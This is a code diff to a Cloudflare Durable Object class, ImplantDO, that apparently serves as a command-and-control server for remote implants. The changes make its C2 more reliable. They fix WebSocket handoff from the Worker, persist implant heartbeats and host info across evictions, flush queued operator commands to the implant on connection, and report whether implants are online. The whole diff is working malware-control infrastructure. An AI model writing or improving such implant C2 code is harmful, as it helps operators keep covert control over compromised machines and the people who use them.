@@ -41,13 +41,40 @@ export class ImplantDO extends DurableObject {
         ts INTEGER
       )`
     );
+    // lastHeartbeat / implantInfo used to live only on the instance, so every DO
+    // eviction (routine under hibernation) silently reset them to 0/null and the
+    // operator showed an online implant as OFFLINE. Persist them instead.
+    this.ctx.storage.sql.exec(
+      `CREATE TABLE IF NOT EXISTS implant_meta (
+        key TEXT PRIMARY KEY,
+        value TEXT,
+        updated_at INTEGER
+      )`
+    );
+  }
+
+  private setMeta(key: string, value: string): void {
+    this.ctx.storage.sql.exec(
+      `INSERT INTO implant_meta (key, value, updated_at) VALUES (?, ?, ?)
+       ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at`,
+      key, value, Date.now()
+    );
+  }
+
+  private getMeta(key: string): string | null {
+    const rows = this.ctx.storage.sql.exec(
+      `SELECT value FROM implant_meta WHERE key = ?`, key
+    ).toArray();
+    return rows.length > 0 ? String(rows[0].value) : null;
   }
 
   async fetch(request: Request): Promise<Response> {
     const url = new URL(request.url);
 
-    // WebSocket upgrade from implant
-    if (request.headers.get('Upgrade') === 'websocket') {
+    // WebSocket upgrade from implant. Accept either signal: the raw Upgrade header,
+    // or an attached socket (which is what actually survives a Worker <-> DO hop).
+    if (request.headers.get('Upgrade') === 'websocket' ||
+        (request as unknown as { webSocket?: WebSocket }).webSocket) {
       return this.handleWebSocketUpgrade(request, url.pathname.split('/')[2] || 'wss');
     }
 
@@ -61,23 +88,30 @@ export class ImplantDO extends DurableObject {
   }
 
   private handleWebSocketUpgrade(request: Request, _transportType: string): Response {
-    const pair = new WebSocketPair();
-    const [client, server] = Object.values(pair) as [WebSocket, WebSocket];
+    // The Worker forwards the *client's* request with `stub.fetch(c.req.raw)`, so the
+    // real implant socket arrives as `request.webSocket`. Building a fresh WebSocketPair
+    // here (as this used to) accepts an orphan socket, leaves the implant's socket
+    // unaccepted (Cloudflare closes it when this handler returns), keeps
+    // getWebSockets() empty, and drops every frame — including flushQueue()'s output.
+    // `webSocket` lives on workers-types' WebSocketRequest, not the base Request.
+    const server = (request as unknown as { webSocket?: WebSocket }).webSocket;
+    if (!server) {
+      return new Response('Missing request.webSocket', { status: 400 });
+    }
 
+    // Hibernatable: the DO stays stateless between frames and is not billed while idle.
     this.ctx.acceptWebSocket(server, ['implant']);
 
-    this.sessions.set('primary', {
-      connectedAt: Date.now(),
-      lastPing: Date.now(),
-    });
+    const now = Date.now();
+    this.sessions.set('primary', { connectedAt: now, lastPing: now });
+    this.setMeta('connected_at', String(now));
 
     // Flush pending commands to the implant upon connection
     this.flushQueue(server);
 
-    return new Response(null, {
-      status: 101,
-      webSocket: client,
-    });
+    // 101 with no `webSocket` body: the socket is already attached to this DO,
+    // and the Worker returns the client half to the implant.
+    return new Response(null, { status: 101 });
   }
 
   private handleOperatorRPC(body: any): Response {
@@ -147,14 +181,20 @@ export class ImplantDO extends DurableObject {
       }
 
       case 'get_status': {
-        const connected = this.ctx.getWebSockets().length > 0;
+        const sockets = this.ctx.getWebSockets();
+        const hb = parseInt(this.getMeta('last_heartbeat') || '0');
+        const infoStr = this.getMeta('implant_info');
+        let info = this.implantInfo;
+        if (infoStr) {
+          try { info = JSON.parse(infoStr); } catch { /* keep in-memory value */ }
+        }
         return new Response(JSON.stringify({
           success: true,
           status: {
-            connected,
-            sessions: this.ctx.getWebSockets().length,
-            lastHeartbeat: this.lastHeartbeat,
-            implantInfo: this.implantInfo,
+            connected: sockets.length > 0,
+            sessions: sockets.length,
+            lastHeartbeat: hb || this.lastHeartbeat,
+            implantInfo: info,
             pendingCommands: this.ctx.storage.sql.exec(
               `SELECT COUNT(*) as count FROM command_queue WHERE status IN ('pending','sent')`
             ).toArray()[0]?.count || 0,
@@ -208,6 +248,8 @@ export class ImplantDO extends DurableObject {
       if (parsed.type === 'heartbeat') {
         this.lastHeartbeat = parsed.ts || Date.now();
         if (parsed.info) this.implantInfo = parsed.info;
+        this.setMeta('last_heartbeat', String(this.lastHeartbeat));
+        if (parsed.info) this.setMeta('implant_info', JSON.stringify(parsed.info));
         this.sessions.set('primary', {
           connectedAt: this.sessions.get('primary')?.connectedAt || Date.now(),
           lastPing: Date.now(),
@@ -244,5 +286,20 @@ export class ImplantDO extends DurableObject {
 
   async webSocketClose(_ws: WebSocket, _code: number, _reason: string, _wasClean: boolean) {
     this.sessions.clear();
+    // Only mark disconnected once the *last* socket is gone, otherwise a reconnect
+    // that races the old socket's close would flip a live implant to offline.
+    if (this.ctx.getWebSockets().length === 0) {
+      this.setMeta('disconnected_at', String(Date.now()));
+    }
+  }
+
+  async webSocketError(ws: WebSocket, _error: unknown) {
+    // Without this handler an errored socket stays in getWebSockets() forever,
+    // so get_status would report a dead implant as connected.
+    try { ws.close(); } catch { /* already closing */ }
+    this.sessions.clear();
+    if (this.ctx.getWebSockets().length === 0) {
+      this.setMeta('disconnected_at', String(Date.now()));
+    }
   }
 }
